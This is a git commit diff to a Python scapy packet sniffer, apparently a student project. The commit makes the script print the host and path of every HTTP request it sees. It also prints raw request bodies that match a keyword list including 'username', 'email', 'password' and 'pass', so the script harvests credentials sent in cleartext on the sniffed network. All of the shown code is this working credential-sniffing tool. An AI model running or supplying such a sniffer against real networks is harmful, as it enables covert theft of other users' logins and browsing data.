4280ad1cfc9056b11b9b3f9d78b4695f92918d8b
vatojavier <antonioj.casado@estudiante.uam.es>
2019-03-04 14:47:13 +0100

    added url display

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -8,11 +8,16 @@ def sniff(interface):
 
 #process the packet received by scapy.sniff called by prn
 def process_packet(packet):
-    if (packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw)):
-        load = packet[scapy.Raw].load
-        keywords = ["username","uname","user","id","email","password","pass","code"]
-        for keyword in keywords:
-            if keyword in load:
-                print(packet[scapy.Raw].load)
+    if packet.haslayer(http.HTTPRequest):
+        #printing url
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print(url)
+        if packet.haslayer(scapy.Raw):
+            #printing interesting stuff
+            load = packet[scapy.Raw].load
+            keywords = ["username","uname","user","id","email","password","pass","code"]
+            for keyword in keywords:
+                if keyword in load:
+                    print(packet[scapy.Raw].load + "\n\n")
 
 sniff("wlp3s0")
